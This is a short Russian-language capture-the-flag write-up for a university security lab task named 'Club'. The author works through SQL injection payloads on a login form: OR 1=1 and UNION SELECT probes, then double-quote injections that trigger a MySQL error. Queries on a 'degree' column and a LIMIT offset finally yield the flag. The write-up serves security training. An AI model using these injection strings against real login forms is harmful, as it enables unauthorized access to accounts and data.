## Club - http://club.tasks.prak.seclab.cs.msu.ru/

1) Видим форму на 2 параметра: `Email` + `Password`, что сразу сподвигает на
мысль об SQL иньекции

сначала пробую:  
`"username=test&pass=test&email=' OR '1'='1"`  
`"username=test&pass=test&email='--"`  
`"username=test&pass=test" -H "Cookie: session=1' OR '1'='1"`

--- ничего не работает на уровне внедрения

попробовал что то простое - в поле юзернейм ввожу что то типа:
`' OR 1=1 --`  
`' OR 1=1 /*`  
`' OR 1=1; --`  
`' OR 1=1 #`

- опять не то

но кстати юнионы везде выдают логин фэйлед, хотя я думал что при каком то из них скажет скольк колонок  
`' UNION SELECT null --`  
`' UNION SELECT null,null --`  
`' UNION SELECT null,null,null --`  
что то при любых запросах `login failed`, это норм?

и тут я попробовал еще `'` заменить на `"` (!)

`ERROR ====> DB error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server
version for the right syntax to use near '''' at line 1. O`

#тут будет вставка про то как я шерстил таблицу

`" OR EXISTS(SELECT 1 FROM pages WHERE degree='Grand Master') #` у меня почему то после такого заходит на грика этого тестового)
  
`" AND 1=0 UNION SELECT 'Grand Master' #`  
` " OR "1"="1" UNION SELECT 'Grand Master' #`

а такое типо `Internal Error`


И в итоге после того как я знал какие есть записи в табице я просто написал `" OR degree = 'Grand Master' # `- и нашел флаг

также еще посмотрев аккуратно таблицы я понял что записи в них хранятся в
алфавитном порядке, в следствие чего я смог просто протыкав найти G

`“ or 1=1 limit 647,1 #` - тоже решение

